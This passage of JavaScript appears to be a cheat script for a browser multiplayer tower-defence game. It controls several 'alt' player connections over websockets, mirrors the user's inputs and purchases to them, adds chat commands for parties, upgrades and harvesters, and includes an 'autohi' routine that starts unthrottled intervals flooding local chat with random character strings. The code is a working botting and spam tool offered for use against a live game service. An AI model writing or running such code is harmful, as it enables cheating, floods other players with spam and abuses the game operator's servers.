                                    ws.network.sendPacket(3, { left: 0 });
                                }
                            }
                        }
                    }
                }
            })
            document.getElementsByClassName("hud")[0].addEventListener("mousedown", function (e) {
                if (!ws.isclosed) {
                    if (isOnControl) {
                        if (!e.button) {
                            ws.mouseDown = 1;
                            ws.mouseUp = 0;
                            ws.network.sendPacket(3, { mouseDown: ws.aimingYaw, worldX: Math.floor(mousePosition.x), worldY: Math.floor(mousePosition.y), distance: Math.floor(game.inputPacketCreator.distanceToCenter((-ws.myPlayer.position.x + mousePosition.x) * 100, (-ws.myPlayer.position.y + mousePosition.y) * 100) / 100) });
                        }
                    }
                }
            });
            document.getElementsByClassName("hud")[0].addEventListener("mouseup", function (e) {
                if (!ws.isclosed) {
                    if (isOnControl) {
                        if (!e.button) {
                            ws.mouseUp = 1;
                            ws.mouseDown = 0;
                            ws.network.sendPacket(3, { mouseUp: 1, worldX: Math.floor(mousePosition.x), worldY: Math.floor(mousePosition.y), distance: Math.floor(game.inputPacketCreator.distanceToCenter((-ws.myPlayer.position.x + mousePosition.x) * 100, (-ws.myPlayer.position.y + mousePosition.y) * 100) / 100) });
                        }
                    }
                }
            });
            if (isOnControl) {
                document.getElementsByClassName("hud-shop-item")[0].addEventListener('click', function () {
                    ws.network.sendPacket(9, { name: "BuyItem", itemName: "Pickaxe", tier: ws.inventory.Pickaxe.tier + 1 });
                });
                document.getElementsByClassName("hud-shop-item")[1].addEventListener('click', function () {
                    if (!ws.inventory.Spear) {
                        ws.network.sendPacket(9, { name: "BuyItem", itemName: "Spear", tier: 1 });
                    } else {
                        ws.network.sendPacket(9, { name: "BuyItem", itemName: "Spear", tier: ws.inventory.Spear.tier + 1 });
                    }
                });
                document.getElementsByClassName("hud-shop-item")[2].addEventListener('click', function () {
                    if (!ws.inventory.Bow) {
                        ws.network.sendPacket(9, { name: "BuyItem", itemName: "Bow", tier: 1 });
                    } else {
                        ws.network.sendPacket(9, { name: "BuyItem", itemName: "Bow", tier: ws.inventory.Bow.tier + 1 });
                    }
                });
                document.getElementsByClassName("hud-shop-item")[3].addEventListener('click', function () {
                    if (!ws.inventory.Bomb) {
                        ws.network.sendPacket(9, { name: "BuyItem", itemName: "Bomb", tier: 1 });
                    } else {
                        ws.network.sendPacket(9, { name: "BuyItem", itemName: "Bomb", tier: ws.inventory.Bomb.tier + 1 });
                    }
                });
                document.getElementsByClassName("hud-shop-item")[t1 + 4].addEventListener('click', function () {
                    ws.network.sendPacket(9, {
                        name: "BuyItem", itemName: "ZombieShield", tier: ws.inventory.ZombieShield ? (ws.inventory.ZombieShield.tier + 1) : 1
                    });
                });
                document.getElementsByClassName("hud-respawn-btn")[0].addEventListener('click', function () {
                    ws.network.sendPacket(3, { respawn: 1 });
                })
                t1 && document.getElementsByClassName("hud-toolbar-item")[0].addEventListener('mouseup', function (e) {
                    if (!e.button) {
                        ws.network.sendPacket(9, { name: "EquipItem", itemName: "Crossbow", tier: ws.inventory.Crossbow.tier });
                    }
                });
                document.getElementsByClassName("hud-toolbar-item")[t1 + 0].addEventListener('mouseup', function (e) {
                    if (!e.button) {
                        ws.network.sendPacket(9, { name: "EquipItem", itemName: "Pickaxe", tier: ws.inventory.Pickaxe.tier });
                    }
                });
                document.getElementsByClassName("hud-toolbar-item")[t1 + 1].addEventListener('mouseup', function (e) {
                    if (!e.button) {
                        ws.network.sendPacket(9, { name: "EquipItem", itemName: "Spear", tier: ws.inventory.Spear.tier });
                    }
                });
                document.getElementsByClassName("hud-toolbar-item")[t1 + 2].addEventListener('mouseup', function (e) {
                    if (!e.button) {
                        ws.network.sendPacket(9, { name: "EquipItem", itemName: "Bow", tier: ws.inventory.Bow.tier });
                    }
                });
                document.getElementsByClassName("hud-toolbar-item")[t1 + 3].addEventListener('mouseup', function (e) {
                    if (!e.button) {
                        ws.network.sendPacket(9, { name: "EquipItem", itemName: "Bomb", tier: ws.inventory.Bomb.tier });
                    }
                });
                document.getElementsByClassName("hud-toolbar-item")[t1 + 4].addEventListener('mouseup', function (e) {
                    if (!e.button) {
                        ws.network.sendPacket(9, { name: "EquipItem", itemName: "HealthPotion", tier: 1 });
                    }
                });
                document.getElementsByClassName("hud-toolbar-item")[t1 + 5].addEventListener('mouseup', function (e) {
                    if (!e.button) {
                        ws.network.sendPacket(9, { name: "EquipItem", itemName: "PetHealthPotion", tier: 1 });
                    }
                });
                document.getElementsByClassName("hud-toolbar-item")[t1 + 6].addEventListener("mouseup", function (e) {
                    if (!e.button) {
                        if (isOnControl) {
                            ws.network.sendPacket(9, { name: "RecallPet" });
                        }
                    }
                })
            }
            ws.respawn = true;

            if (window.aim) {
                ws.autoaim = true;
            };

            if (window.move) {
                ws.automove = true;
            };

            if (window.autohiBot) {
                ws.autohi = true;
            };

            document.getElementsByClassName("1i2")[0].addEventListener('click', () => {
                ws.autoaim = !ws.autoaim;

                if (ws.autoaim) {
                    window.aim = true;
                } else {
                    window.aim = false;
                };
            });
            document.getElementsByClassName("3i2")[0].addEventListener('click', () => {
                if (ws.cloneId == document.getElementsByClassName("4i2")[0].value) {
                    ws.close();
                    altElem.remove();
                };
            });

            document.getElementsByClassName("7i2")[0].addEventListener('click', () => {
                ws.close();
                altElem.remove();
            });

            document.getElementsByClassName("0i1")[0].addEventListener('click', () => {
                if (ws.myPlayer) {
                    if (ws.myPlayer.position) {
                        ws.network.sendPacket(9, { name: "CastSpell", spell: "HealTowersSpell", x: Math.round(game.renderer.screenToWorld(game.ui.mousePosition.x, 0).x), y: Math.round(game.renderer.screenToWorld(0, game.ui.mousePosition.y).y), tier: 1 });
                    };
                };
            });

            document.getElementsByClassName("1i1")[0].addEventListener('click', () => {
                if (ws.myPlayer) {
                    if (ws.myPlayer.position) {
                        ws.network.sendPacket(9, { name: "BuyItem", itemName: "Pause", tier: 1 });
                    };
                };
            });

            function findNearestAltToMouse() {
                if (window.allSockets.length < 1) return;

                let altArray = [];
                let targetMouse = game.renderer.screenToWorld(game.ui.mousePosition.x, game.ui.mousePosition.y)

                for (let i in window.allSockets) {
                    altArray.push(window.allSockets[i].myPlayer);
                };

                if (altArray.length < 1) return;

                altArray.sort((a, b) => measureDistance(targetMouse, a.position) - measureDistance(targetMouse, b.position));

                return altArray[0];
            };
            document.getElementsByClassName("2i1")[0].addEventListener('click', () => {
                if (ws.myPlayer && !ws.isclosed) {
                    if (findNearestAltToMouse().uid == ws.myPlayer.uid) {
                        window.one = true;
                        ws.network.sendPacket(3, {
                            space: 0
                        })
                        ws.network.sendPacket(3, {
                            space: 1
                        })
                    };
                };
            })
            function findNearestAltToStash() {
                if (window.allSockets.length < 1) return;

                let altArray = [];
                let targetGoldStash = Object.values(game.world.entities).find(building => building.fromTick.model == "GoldStash");

                for (let i in window.allSockets) {
                    altArray.push(window.allSockets[i].myPlayer);
                };

                if (altArray.length < 1) return;

                altArray.sort((a, b) => measureDistance(targetGoldStash.fromTick.position, a.position) - measureDistance(targetGoldStash.fromTick.position, b.position));

                return altArray[0];
            };
            document.getElementsByClassName("3i1")[0].addEventListener('click', () => {
                if (ws.myPlayer && !ws.isclosed) {
                    if (findNearestAltToStash().uid == ws.myPlayer.uid) {
                        window.one = true;
                        ws.network.sendPacket(3, {
                            space: 0
                        });
                        ws.network.sendPacket(3, {
                            space: 1
                        });
                    };
                };
            })

            let id = -1;
            let alts = [];
            function nextAlt() {
                if (window.allSockets.length < 1) return;

                for (let k in window.allSockets) {
                    if (!window.allSockets[k].isclosed) {
                        alts.push(window.allSockets[k].myPlayer)
                    }
                };

                if (alts.length < 1) return;

                return alts[id];
                if (id > alts.length + 2) {
                    id = -1;
                }
            };
            document.getElementsByClassName("4i1")[0].addEventListener('click', () => {
                id++
                if (!ws.isclosed) {
                    if (ws.myPlayer) {
                        if (nextAlt().uid == ws.myPlayer.uid) {
                            game.ui.components.PopupOverlay.showHint("Joined alt with the id " + ws.cloneId + ".");
                            game.network.sendRpc({ name: "JoinPartyByShareKey", partyShareKey: ws.psk.response.partyShareKey + "" });
                        };;
                    };
                };
            });

            document.getElementsByClassName("19i1")[0].addEventListener('click', () => {
                let id = document.getElementsByClassName("8i1")[0].value;
                let psk = document.getElementsByClassName("18i1")[0].value;
                if (psk && id) {
                    game.ui.components.PopupOverlay.showHint("Please remove either the id or psk.")
                };
                if (psk && !id) {
                    game.network.sendRpc({ name: "JoinPartyByShareKey", partyShareKey: psk });
                };
                if (id && !psk) {
                    game.network.sendRpc({ name: "JoinPartyByShareKey", partyShareKey: ws.psk.response.partyShareKey + "" });
                };
            });

            document.getElementsByClassName("4i1")[0].addEventListener('click', () => {
                alts = [];
            });

            document.getElementsByClassName("7i1")[0].addEventListener('click', () => {
                let id = document.getElementsByClassName("8i1")[0].value;
                let psk = document.getElementsByClassName("18i1")[0].value;
                if (psk && id) {
                    if (ws.cloneId == id) {
                        ws.network.sendPacket(9, { name: "JoinPartyByShareKey", partyShareKey: psk });
                    };
                };
                if (ws.cloneId == id && !psk) {
                    ws.network.sendPacket(9, { name: "JoinPartyByShareKey", partyShareKey: game.ui.playerPartyShareKey });
                };
            });

            document.getElementsByClassName("9i1")[0].addEventListener('click', () => {
                let id = document.getElementsByClassName("8i1")[0].value;
                if (ws.cloneId == id) {
                    ws.network.sendPacket(9, { name: "LeaveParty" });
                };
            });

            document.getElementsByClassName("5i1")[0].addEventListener('click', () => {
                let psk = document.getElementsByClassName("18i1")[0].value;
                if (ws.myPlayer && !psk) {
                    ws.network.sendPacket(9, { name: "JoinPartyByShareKey", partyShareKey: game.ui.playerPartyShareKey });
                } else ws.network.sendPacket(9, { name: "JoinPartyByShareKey", partyShareKey: psk });
            });

            document.getElementsByClassName("6i1")[0].addEventListener('click', () => {
                if (ws.myPlayer) {
                    ws.network.sendPacket(9, { name: "LeaveParty" });
                };
            });

            document.getElementsByClassName("10i1")[0].addEventListener('click', function () {
                if (!ws.inventory.Pickaxe) {
                    ws.network.sendPacket(9, { name: "BuyItem", itemName: "Pickaxe", tier: 1 })
                } else {
                    ws.network.sendPacket(9, { name: "BuyItem", itemName: "Pickaxe", tier: ws.inventory.Pickaxe.tier + 1 })
                }
                setTimeout(() => {
                    ws.network.sendPacket(9, { name: "EquipItem", itemName: "Pickaxe", tier: ws.inventory.Pickaxe.tier })
                }, 101)
            })

            document.getElementsByClassName("11i1")[0].addEventListener('click', function () {
                if (!ws.inventory.Spear) {
                    ws.network.sendPacket(9, { name: "BuyItem", itemName: "Spear", tier: 1 })
                } else {
                    ws.network.sendPacket(9, { name: "BuyItem", itemName: "Spear", tier: ws.inventory.Spear.tier + 1 })
                }
                setTimeout(() => {
                    ws.network.sendPacket(9, { name: "EquipItem", itemName: "Spear", tier: ws.inventory.Spear.tier })
                }, 101)
            })

            document.getElementsByClassName("12i1")[0].addEventListener('click', function () {
                if (!ws.inventory.Bow) {
                    ws.network.sendPacket(9, { name: "BuyItem", itemName: "Bow", tier: 1 })
                } else {
                    ws.network.sendPacket(9, { name: "BuyItem", itemName: "Bow", tier: ws.inventory.Bow.tier + 1 })
                }
                setTimeout(() => {
                    ws.network.sendPacket(9, { name: "EquipItem", itemName: "Bow", tier: ws.inventory.Bow.tier })
                }, 101)
            })

            document.getElementsByClassName("13i1")[0].addEventListener('click', function () {
                if (!ws.inventory.Bomb) {
                    ws.network.sendPacket(9, { name: "BuyItem", itemName: "Bomb", tier: 1 })
                } else {
                    ws.network.sendPacket(9, { name: "BuyItem", itemName: "Bomb", tier: ws.inventory.Bomb.tier + 1 })
                }
                setTimeout(() => {
                    ws.network.sendPacket(9, { name: "EquipItem", itemName: "Bomb", tier: ws.inventory.Bomb.tier })
                }, 101)
            })

            document.getElementsByClassName("14i1")[0].addEventListener('click', function () {
                if (!ws.inventory.ZombieShield) {
                    ws.network.sendPacket(9, { name: "BuyItem", itemName: "ZombieShield", tier: 1 })
                } else {
                    ws.network.sendPacket(9, { name: "BuyItem", itemName: "ZombieShield", tier: ws.inventory.ZombieShield.tier + 1 })
                }
                setTimeout(() => {
                    ws.network.sendPacket(9, { name: "EquipItem", itemName: "ZombieShield", tier: ws.inventory.ZombieShield.tier })
                }, 101)
            })

            document.getElementsByClassName("15i1")[0].addEventListener('click', function () {
                ws.network.sendPacket(9, { name: "BuyItem", itemName: "PetCARL", tier: 1 });
                ws.network.sendPacket(9, { name: "EquipItem", itemName: "PetCARL", tier: 1 });
            });

            document.getElementsByClassName("16i1")[0].addEventListener('click', function () {
                ws.network.sendPacket(9, { name: "BuyItem", itemName: "PetMiner", tier: 1 });
                ws.network.sendPacket(9, { name: "EquipItem", itemName: "PetMiner", tier: 1 });
            });

            document.getElementsByClassName("17i1")[0].addEventListener('click', function () {
                if (ws.myPet) {
                    ws.network.sendPacket(9, { name: "DeleteBuilding", uid: ws.myPet.uid });
                };
            });

            document.getElementsByClassName("8i2")[0].addEventListener('click', () => {
                if (ws.myPlayer) {
                    game.ui.components.Chat.onMessageReceived({ displayName: ws.cloneId, message: `Wave: ${ws.myPlayer.wave}, W: ${counter(ws.myPlayer.wood)}, S: ${counter(ws.myPlayer.stone)}, G: ${counter(ws.myPlayer.gold)};` });
                };
            });

            document.getElementsByClassName("21i2")[0].addEventListener('click', () => {
                isOnControl = !isOnControl
                document.getElementsByClassName('21i2')[0].innerText = isOnControl ? 'Uncontrol Alts!' : 'Control Alts!';
            });

            document.getElementsByClassName("0i5")[0].addEventListener('click', () => {
                ws.network.sendPacket(9, { name: "SetPartyName", partyName: document.getElementsByClassName("1i5")[0].value });
            });

            document.getElementsByClassName("2i5")[0].addEventListener('click', () => {
                ws.network.sendPacket(9, { name: "SetOpenParty", isOpen: 1 });
            });

            document.getElementsByClassName("3i5")[0].addEventListener('click', () => {
                ws.network.sendPacket(9, { name: "SetOpenParty", isOpen: 0 });
            });
        };
        if (ws.data.uid) {
            ws.uid = ws.data.uid;
            ws.inventory = {};

            if (window.allSockets[ws.cloneId - 1]) {
                window.allSockets[ws.cloneId - 1] = ws;
            }

            ws.network.sendPacket(3, { space: 1 });

            ws.network.sendPacket(9, { name: "BuyItem", itemName: "PetCARL", tier: 1 });

            ws.network.sendPacket(9, { name: "EquipItem", itemName: "PetCARL", tier: 1 });

            ws.network.sendPacket(9, { name: "BuyItem", itemName: "PetMiner", tier: 1 });

            ws.network.sendPacket(9, { name: "EquipItem", itemName: "PetMiner", tier: 1 });
        };

        if (ws.data.entities) {
            if (window.message == ws.cloneId) {
                game.world.replicator.onEntityUpdate(ws.data);
            };

            if (ws.data.entities[ws.uid].name) {
                ws.myPlayer = ws.data.entities[ws.uid];
            };

            for (let g in ws.myPlayer) {
                if (ws.myPlayer[g] !== ws.data.entities[ws.uid][g] && ws.data.entities[ws.uid][g] !== undefined) {
                    ws.myPlayer[g] = ws.data.entities[ws.uid][g];
                };
            };

            if (ws.myPlayer.petUid) {
                if (ws.data.entities[ws.myPlayer.petUid]) {
                    if (ws.data.entities[ws.myPlayer.petUid].model) {
                        ws.myPet = ws.data.entities[ws.myPlayer.petUid];
                        ws.shouldHealPet = false;
                    };
                };
                for (let g in ws.myPet) {
                    if (ws.data.entities[ws.myPlayer.petUid]) {
                        if (ws.myPet[g] !== ws.data.entities[ws.myPlayer.petUid][g] && ws.data.entities[ws.myPlayer.petUid][g] !== undefined) {
                            ws.myPet[g] = ws.data.entities[ws.myPlayer.petUid][g]
                        }
                    }
                }
            }

            altElem.style.left = (Math.round(ws.myPlayer.position.x) / game.world.getHeight() * 100) + '%';
            altElem.style.top = (Math.round(ws.myPlayer.position.y) / game.world.getWidth() * 100) + '%';
        };
        if (ws.data.name === "Dead") {
            if (!window.autoraid && window.one === true) {
                ws.network.sendPacket(3, { space: 1 });
                ws.network.sendPacket(3, { space: 0 });
                window.one = false;
            };
        };

        if (ws.data.name == "SetItem") {
            ws.inventory[ws.data.response.itemName] = ws.data.response;

            if (!ws.inventory[ws.data.response.itemName].stacks) {
                delete ws.inventory[ws.data.response.itemName];
            };

            if (ws.data.response.itemName == "ZombieShield" && ws.data.response.stacks) {
                ws.network.sendPacket(9, { name: "EquipItem", itemName: "ZombieShield", tier: ws.data.response.tier });
            };
        };

        if ((game.world.entities[ws.uid] && game.world.getEntityByUid(ws.uid))) {
            for (let socket in window.allSockets) {
                let wss = window.allSockets[socket];

                if (wss) {
                    let {
                        uid,
                        cloneId
                    } = wss;
                    if (((game.world.entities[uid] && game.world.getEntityByUid(uid))) && (game.world.getEntityByUid(uid)).targetTick) {
                        game.world.getEntityByUid(uid).isVerified = true;
                        if (!getRss) {
                            game.world.getEntityByUid(uid).targetTick.name = cloneId.toString();
                        } else {
                            game.world.getEntityByUid(uid).targetTick.oldName = cloneId.toString();
                        };
                    };
                };
            };
        };

        if (ws.data.name == "ReceiveChatMessage") {
            ws.message = ws.data;
            if (ws.message.response.message.toLowerCase() == "!move" && ws.message.response.uid == game.world.myUid) {
                ws.mousemove = true;
            }
            if (ws.message.response.message.toLowerCase() == "!unmove" && ws.message.response.uid == game.world.myUid) {
                ws.mousemove = false;
            }
            if (ws.message.response.message.toLowerCase() == "!spam" && ws.message.response.uid == game.world.myUid) {
                ws.spam = true;
            }
            if (ws.message.response.message.toLowerCase() == "!!spam" && ws.message.response.uid == game.world.myUid) {
                ws.spam = false;
            }
            if (ws.message.response.message.toLowerCase() == `#` && ws.message.response.uid == game.world.myUid) {
                let word = ws.message.response.message;
                let uid = '';
                for (let i = 0; i < 30; i++) {
                    if (Math.round(word[i] == 0 || word[i] == 1 || word[i] == 2 || word[i] == 3 || word[i] == 4 || word[i] == 5 || word[i] == 6 || word[i] == 7 || word[i] == 8 || word[i] == 9)) {
                        uid += word[i]
                    }
                    uid = Math.round(uid);
                    ws.playerUid = uid;
                }
            }
            if (ws.message.response.message.toLowerCase() == "!aim" && ws.message.response.uid == game.world.myUid) {
                window.move = true;
            }
            if (ws.message.response.message.toLowerCase() == "!unaim" && ws.message.response.uid == game.world.myUid) {
                window.move = false;
            };
            if (ws.message.response.message.toLowerCase() == "!c" && ws.message.response.uid == game.world.myUid) {
                isOnControl = true;
            }
            if (ws.message.response.message.toLowerCase() == `!c ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                isOnControl = true;
            }
            if (ws.message.response.message.toLowerCase() == "!!c" && ws.message.response.uid == game.world.myUid) {
                isOnControl = false;
            }
            if (ws.message.response.message.toLowerCase() == `!!c ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                isOnControl = false;
            }
            if (ws.message.response.message.toLowerCase() == `!r` && ws.message.response.uid == game.world.myUid) {
                ws.network.sendPacket(3, { respawn: 1 })
            }
            if (ws.message.response.message.toLowerCase() == "!spear" && ws.message.response.uid == game.world.myUid) {
                if (!ws.inventory.Spear) {
                    ws.network.sendPacket(9, { name: "BuyItem", itemName: "Spear", tier: 1 });
                } else {
                    ws.network.sendPacket(9, { name: "BuyItem", itemName: "Spear", tier: ws.inventory.Spear.tier + 1 });
                }
                setTimeout(() => {
                    ws.network.sendPacket(9, { name: "EquipItem", itemName: "Spear", tier: ws.inventory.Spear.tier })
                }, 100)
            }
            if (ws.message.response.message.toLowerCase() == `!psk ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                ws.network.sendPacket(9, { name: "SendChatMessage", channel: "Local", message: `${ws.psk.response.partyShareKey}` })
            }
            if (ws.message.response.message.toLowerCase() == `!l ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                ws.network.sendPacket(9, { name: "LeaveParty" })
            }
            if (ws.message.response.message.toLowerCase() == `!j ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                game.network.sendRpc({ name: "JoinPartyByShareKey", partyShareKey: ws.psk.response.partyShareKey });
            };
            if (ws.message.response.message.toLowerCase() == `!altj ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                ws.network.sendPacket(9, { name: "JoinPartyByShareKey", partyShareKey: game.ui.getPlayerPartyShareKey() })
            }
            if (ws.message.response.message.toLowerCase() == `!tj ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                const psk = game.ui.playerPartyShareKey
                setTimeout(() => {
                    ws.network.sendPacket(9, { name: "JoinPartyByShareKey", partyShareKey: psk })
                }, 3000)
            }
            if (ws.message.response.message.toLowerCase() == `${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                ws.network.sendPacket(3, { space: 1 })
                ws.network.sendPacket(3, { space: 0 })
                setTimeout(() => {
                    ws.network.sendPacket(3, { space: 1 })
                    ws.network.sendPacket(3, { space: 0 })
                }, 3000)
            }
            if (ws.message.response.message.toLowerCase() == `!s ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                ws.network.sendPacket(9, { name: "SendChatMessage", channel: "Local", message: `W: ${counter(ws.myPlayer.wood)}, S: ${counter(ws.myPlayer.stone)}, G: ${counter(ws.myPlayer.gold)}, ID: ${ws.cloneId};` })
            }
            if (ws.message.response.message.toLowerCase() == "!h" && ws.message.response.uid == game.world.myUid) {
                ws.autohi = !ws.autohi;
                if (ws.autohi) {
                    window.autohiBot = true;
                } else {
                    window.autohiBot = false;
                };
            };
            if (ws.message.response.message.toLowerCase() == "!ahrc" && ws.message.response.uid == game.world.myUid) {
                ws.ahrc = true;
            }
            if (ws.message.response.message.toLowerCase() == `!ahrc ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                ws.ahrc = true;
            }
            if (ws.message.response.message.toLowerCase() == "!!ahrc" && ws.message.response.uid == game.world.myUid) {
                ws.ahrc = false;
            }
            if (ws.message.response.message.toLowerCase() == `!!ahrc ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                ws.ahrc = false;
            }
            if (ws.message.response.message.toLowerCase() == "!4pt" && ws.message.response.uid == game.world.myUid) {
                ws.scoretrick = true;
            }
            if (ws.message.response.message.toLowerCase() == `!4pt ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                ws.scoretrick = true;
            }
            if (ws.message.response.message.toLowerCase() == "!!4pt" && ws.message.response.uid == game.world.myUid) {
                ws.scoretrick = false;
            }
            if (ws.message.response.message.toLowerCase() == `!!4pt ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                ws.scoretrick = false;
            }
            if (ws.message.response.message.toLowerCase() == "!space" && ws.message.response.uid == game.world.myUid) {
                ws.network.sendPacket(3, { space: 0 })
                ws.network.sendPacket(3, { space: 1 });
            };
            if (ws.message.response.message == "!upgrade" && ws.message.response.uid == game.world.myUid) {
                for (let i in ws.buildings) {
                    if (ws.buildings[i].type == "GoldMine") {
                        ws.network.sendPacket(9, { name: "UpgradeBuilding", uid: ws.buildings[i].uid })
                    }
                    setTimeout(() => {
                        ws.network.sendPacket(9, { name: "UpgradeBuilding", uid: ws.buildings[i].uid })
                    }, 100);
                }
            }
            if (ws.message.response.message.toLowerCase() == `!respawn ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                ws.respawn = true;
            }
            if (ws.message.response.message.toLowerCase() == "!respawn" && ws.message.response.uid == game.world.myUid) {
                ws.respawn = true;
            }
            if (ws.message.response.message.toLowerCase() == "!!respawn" && ws.message.response.uid == game.world.myUid) {
                ws.respawn = false;
            };
            if (ws.message.response.message.toLowerCase() == `!leave ${ws.cloneId}` && ws.message.response.uid == game.world.myUid) {
                ws.network.sendPacket(9, { name: 'LeaveParty' });
            };
            if (ws.message.response.message.toLowerCase() == "!ab" && ws.message.response.uid == game.world.myUid) {
                ws.autobomb = true;
            }
            if (ws.message.response.message.toLowerCase() == "!!ab" && ws.message.response.uid == game.world.myUid) {
                ws.autobomb = false;
            }

            if (ws.message.response.message.toLowerCase() == "!up" && ws.message.response.uid == game.world.myUid) {
                for (let i in game.ui.buildings) {
                    ws.network.sendPacket(9, { name: "UpgradeBuilding", itemName: game.ui.buildings[i].uid });
                };
            };

            if (ws.message.response.message == "!upStash" && ws.message.response.uid == game.world.myUid) {
                for (let i in game.ui.buildings) {
                    if (game.ui.buildings[i].type === "GoldStash") {
                        ws.network.sendPacket(9, { name: "UpgradeBuilding", uid: game.ui.buildings[i].uid });
                    };
                };
            };

            if (ws.message.response.message == "!up1" && ws.message.response.uid == game.world.myUid) {
                for (let i in ws.buildings) {
                    if (ws.buildings[i].type == "Wall") {
                        ws.network.sendPacket(9, { name: "UpgradeBuilding", uid: ws.buildings[i].uid });
                    };
                };
            };

            if (ws.message.response.message == "!up2" && ws.message.response.uid == game.world.myUid) {
                for (let i in ws.buildings) {
                    if (ws.buildings[i].type == "Door") {
                        ws.network.sendPacket(9, { name: "UpgradeBuilding", uid: ws.buildings[i].uid });
                    };
                };
            };

            if (ws.message.response.message == "!up3" && ws.message.response.uid == game.world.myUid) {
                for (let i in ws.buildings) {
                    if (ws.buildings[i].type == "SlowTrap") {
                        ws.network.sendPacket(9, { name: "UpgradeBuilding", uid: ws.buildings[i].uid });
                    };
                };
            };

            if (ws.message.response.message == "!up4" && ws.message.response.uid == game.world.myUid) {
                for (let i in ws.buildings) {
                    if (ws.buildings[i].type == "ArrowTower") {
                        ws.network.sendPacket(9, { name: "UpgradeBuilding", uid: ws.buildings[i].uid });
                    };
                };
            };

            if (ws.message.response.message == "!up5" && ws.message.response.uid == game.world.myUid) {
                for (let i in ws.buildings) {
                    if (ws.buildings[i].type == "CannonTower") {
                        ws.network.sendPacket(9, { name: "UpgradeBuilding", uid: ws.buildings[i].uid });
                    };
                };
            };

            if (ws.message.response.message == "!up6" && ws.message.response.uid == game.world.myUid) {
                for (let i in ws.buildings) {
                    if (ws.buildings[i].type == "MeleeTower") {
                        ws.network.sendPacket(9, { name: "UpgradeBuilding", uid: ws.buildings[i].uid });
                    };
                };
            };

            if (ws.message.response.message == "!up7" && ws.message.response.uid == game.world.myUid) {
                for (let i in ws.buildings) {
                    if (ws.buildings[i].type == "BombTower") {
                        ws.network.sendPacket(9, { name: "UpgradeBuilding", uid: ws.buildings[i].uid });
                    };
                };
            };

            if (ws.message.response.message == "!up8" && ws.message.response.uid == game.world.myUid) {
                for (let i in ws.buildings) {
                    if (ws.buildings[i].type == "MagicTower") {
                        ws.network.sendPacket(9, { name: "UpgradeBuilding", uid: ws.buildings[i].uid });
                    };
                };
            };

            if (ws.message.response.message == "!up9" && ws.message.response.uid == game.world.myUid) {
                for (let i in ws.buildings) {
                    if (ws.buildings[i].type == "GoldMine") {
                        ws.network.sendPacket(9, { name: "UpgradeBuilding", uid: ws.buildings[i].uid });
                    };
                };
            };

            if (ws.message.response.message == "!up0" && ws.message.response.uid == game.world.myUid) {
                for (let i in ws.buildings) {
                    if (ws.buildings[i].name == "Resource Harvester") {
                        ws.network.sendPacket(9, { name: "UpgradeBuilding", uid: ws.buildings[i].uid });
                    };
                };
            };

            if (ws.message.response.message.toLowerCase() == "a" && ws.message.response.uid == game.world.myUid) {
                ws.network.sendPacket(3, { left: 1 });
                ws.network.sendPacket(3, { right: 0 });
            }
            if (ws.message.response.message.toLowerCase() == "d" && ws.message.response.uid == game.world.myUid) {
                ws.network.sendPacket(3, { right: 1 });
                ws.network.sendPacket(3, { left: 0 });
            }
            if (ws.message.response.message.toLowerCase() == "w" && ws.message.response.uid == game.world.myUid) {
                ws.network.sendPacket(3, { up: 1 });
                ws.network.sendPacket(3, { down: 0 });
            }
            if (ws.message.response.message.toLowerCase() == "s" && ws.message.response.uid == game.world.myUid) {
                ws.network.sendPacket(3, { down: 1 });
                ws.network.sendPacket(3, { up: 0 });
            }
            if (ws.message.response.message.toLowerCase() == "f" && ws.message.response.uid == game.world.myUid) {
                ws.network.sendPacket(3, { left: 0 });
                ws.network.sendPacket(3, { right: 0 });
                ws.network.sendPacket(3, { down: 0 });
                ws.network.sendPacket(3, { up: 0 });
            }
        }
        if (ws.autohi) {
            if (ws.data.entities) {
                let sus = setInterval(() => {
                    let msg = "";
                    let msg2 = "";
                    for (let i = 0; i < 15; i++) {
                        msg += `&#${Math.random() * 2500 + 100 | 0};`;
                    }
                    for (let i = 0; i < 15; i++) {
                        msg2 += `&#${Math.random() * 2500 + 100 | 0};`;
                    }
                    ws.network.sendPacket(9, { name: "SendChatMessage", message: `${msg}${msg2}`, channel: "Local" });
                });
            };
        };
        if (ws.ahrc) {
            for (let uid in ws.buildings) {
                let obj = ws.buildings[uid];
                ws.network.sendPacket(9, { name: "CollectHarvester", uid: obj.uid });
                if (obj.type == "Harvester" && obj.tier == 1) {
                    ws.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.uid, deposit: 20 / 2 });
                }
                if (obj.type == "Harvester" && obj.tier == 2) {
                    ws.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.uid, deposit: 30 / 2 });
                }
                if (obj.type == "Harvester" && obj.tier == 3) {
                    ws.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.uid, deposit: 35 / 2 });
                }
                if (obj.type == "Harvester" && obj.tier == 4) {
                    ws.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.uid, deposit: 50 / 2 });
                }
                if (obj.type == "Harvester" && obj.tier == 5) {
                    ws.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.uid, deposit: 60 / 2 });
                }
                if (obj.type == "Harvester" && obj.tier == 6) {
                    ws.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.uid, deposit: 70 / 2 });
                }
                if (obj.type == "Harvester" && obj.tier == 7) {
                    ws.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.uid, deposit: 120 / 2 });
                }
                if (obj.type == "Harvester" && obj.tier == 8) {
                    ws.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.uid, deposit: 150 / 2 });
                }
            };
        };
        if (ws.respawn) {
            ws.network.sendPacket(3, { respawn: 1 });
        }
        if (window.spam) {
            spamMessage = document.getElementsByClassName("27i2")[0].value;
